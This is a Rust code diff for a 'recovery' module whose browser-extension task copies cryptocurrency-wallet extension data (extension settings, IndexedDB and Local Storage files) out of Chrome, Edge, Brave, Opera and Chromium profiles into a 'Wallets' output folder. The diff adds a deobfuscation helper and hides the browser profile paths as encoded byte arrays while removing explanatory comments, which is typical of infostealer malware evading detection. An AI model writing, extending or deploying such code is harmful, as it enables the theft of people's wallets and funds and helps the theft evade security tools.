@@ -1,5 +1,6 @@
 use crate::recovery::context::RecoveryContext;
 use crate::recovery::fs::copy_dir_limited;
+use crate::recovery::helpers::obfuscation::{deobf};
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use async_trait::async_trait;
 use std::path::{Path, PathBuf};
@@ -307,62 +308,86 @@ impl RecoveryTask for BrowserExtensionTask {
         let local_storage = self.profile.path.join("Local Storage").join("leveldb");
 
         for (name, id) in TARGET_EXTENSIONS {
-            // 1. Grab Local Extension Settings
             let extension_settings_dir = local_ext_settings.join(id);
             if fs::metadata(&extension_settings_dir).await.is_ok() {
-                let dest_root = ctx.output_dir.join("services").join("Wallets").join(format!(
-                    "{}_{}_{}_Settings",
-                    self.profile.browser.label(),
-                    self.profile.profile_name,
-                    name
-                ));
+                let dest_root = ctx
+                    .output_dir
+                    .join("services")
+                    .join("Wallets")
+                    .join(format!(
+                        "{}_{}_{}_Settings",
+                        self.profile.browser.label(),
+                        self.profile.profile_name,
+                        name
+                    ));
                 let _ = fs::create_dir_all(&dest_root).await;
-                let _ = copy_dir_limited(&extension_settings_dir, &dest_root, name, &mut artifacts, usize::MAX, 0).await;
+                let _ = copy_dir_limited(
+                    &extension_settings_dir,
+                    &dest_root,
+                    name,
+                    &mut artifacts,
+                    usize::MAX,
+                    0,
+                )
+                .await;
             }
 
-            // 2. Grab IndexedDB data
-            // Usually formatted as: chrome-extension_[id]_0.indexeddb.leveldb
             if fs::metadata(&indexed_db).await.is_ok() {
                 let mut dir = fs::read_dir(&indexed_db).await?;
                 while let Some(entry) = dir.next_entry().await? {
                     let fname = entry.file_name().to_string_lossy().to_string();
                     if fname.contains(id) {
-                        let dest_root = ctx.output_dir.join("services").join("Wallets").join(format!(
-                            "{}_{}_{}_IndexedDB",
-                            self.profile.browser.label(),
-                            self.profile.profile_name,
-                            name
-                        ));
+                        let dest_root =
+                            ctx.output_dir
+                                .join("services")
+                                .join("Wallets")
+                                .join(format!(
+                                    "{}_{}_{}_IndexedDB",
+                                    self.profile.browser.label(),
+                                    self.profile.profile_name,
+                                    name
+                                ));
                         let _ = fs::create_dir_all(&dest_root).await;
-                        let _ = copy_dir_limited(&entry.path(), &dest_root.join(&fname), name, &mut artifacts, usize::MAX, 0).await;
+                        let _ = copy_dir_limited(
+                            &entry.path(),
+                            &dest_root.join(&fname),
+                            name,
+                            &mut artifacts,
+                            usize::MAX,
+                            0,
+                        )
+                        .await;
                     }
                 }
             }
 
-            // 3. Grab Local Storage leveldb data for the extension
             if fs::metadata(&local_storage).await.is_ok() {
-                 let dest_root = ctx.output_dir.join("services").join("Wallets").join(format!(
-                    "{}_{}_{}_Storage",
-                    self.profile.browser.label(),
-                    self.profile.profile_name,
-                    name
-                ));
-                
+                let dest_root = ctx
+                    .output_dir
+                    .join("services")
+                    .join("Wallets")
+                    .join(format!(
+                        "{}_{}_{}_Storage",
+                        self.profile.browser.label(),
+                        self.profile.profile_name,
+                        name
+                    ));
+
                 let mut dir = fs::read_dir(&local_storage).await?;
                 while let Some(entry) = dir.next_entry().await? {
                     let fname = entry.file_name().to_string_lossy().to_string();
                     if fname.contains(id) {
-                         let _ = fs::create_dir_all(&dest_root).await;
-                         let target = dest_root.join(&fname);
-                         if let Ok(_) = fs::copy(entry.path(), &target).await {
-                             let meta = fs::metadata(&target).await?;
-                             artifacts.push(RecoveryArtifact {
-                                 label: format!("{} Storage", name),
-                                 path: target,
-                                 size_bytes: meta.len(),
-                                 modified: meta.modified().ok(),
-                             });
-                         }
+                        let _ = fs::create_dir_all(&dest_root).await;
+                        let target = dest_root.join(&fname);
+                        if let Ok(_) = fs::copy(entry.path(), &target).await {
+                            let meta = fs::metadata(&target).await?;
+                            artifacts.push(RecoveryArtifact {
+                                label: format!("{} Storage", name),
+                                path: target,
+                                size_bytes: meta.len(),
+                                modified: meta.modified().ok(),
+                            });
+                        }
                     }
                 }
             }
@@ -394,24 +419,44 @@ pub fn browser_data_roots(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> 
     vec![
         (
             BrowserName::Chrome,
-            ctx.local_data_dir.join("Google/Chrome/User Data"),
+            // "Google/Chrome/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0xFA, 0xCE, 0xCE, 0xDA, 0xDB, 0xD8, 0xAF, 0xFC, 0xCD, 0xCF, 0xD2, 0xDB, 0xD8, 0xAF,
+                0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
+            ])),
         ),
         (
             BrowserName::Edge,
-            ctx.local_data_dir.join("Microsoft/Edge/User Data"),
+            // "Microsoft/Edge/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE, 0xD2, 0xDB, 0xC9, 0xAF, 0xFC, 0xDB, 0xDA, 0xD8,
+                0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
+            ])),
         ),
         (
             BrowserName::Brave,
-            ctx.local_data_dir
-                .join("BraveSoftware/Brave-Browser/User Data"),
+            // "BraveSoftware/Brave-Browser/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0x9F, 0xCF, 0xDA, 0xC3, 0xD8, 0xA6, 0xD2, 0xDB, 0xDB, 0x8A, 0xDA, 0xCF, 0xCE, 0xAF,
+                0x9F, 0xCF, 0xDA, 0xC3, 0xD8, 0x90, 0x9F, 0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF, 0xAF,
+                0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
+            ])),
         ),
         (
             BrowserName::Opera,
-            ctx.roaming_data_dir.join("Opera Software/Opera Stable"),
+            // "Opera Software/Opera Stable"
+            ctx.roaming_data_dir.join(deobf(&[
+                0xFC, 0x8D, 0xD8, 0xCF, 0xDA, 0xE1, 0xA6, 0xD2, 0xDB, 0xDB, 0x8A, 0xDA, 0xCF, 0xCE,
+                0xAF, 0xFC, 0x8D, 0xD8, 0xCF, 0xDA, 0xE1, 0xA6, 0xDB, 0xDA, 0x9F, 0xDB, 0xD8,
+            ])),
         ),
         (
             BrowserName::Chromium,
-            ctx.local_data_dir.join("Chromium/User Data"),
+            // "Chromium/User Data"
+            ctx.local_data_dir.join(deobf(&[
+                0xFC, 0xCD, 0xCF, 0xD2, 0xDB, 0xD4, 0xC8, 0xDB, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1,
+                0xF1, 0xDA, 0xDB, 0xDA,
+            ])),
         ),
     ]
 }
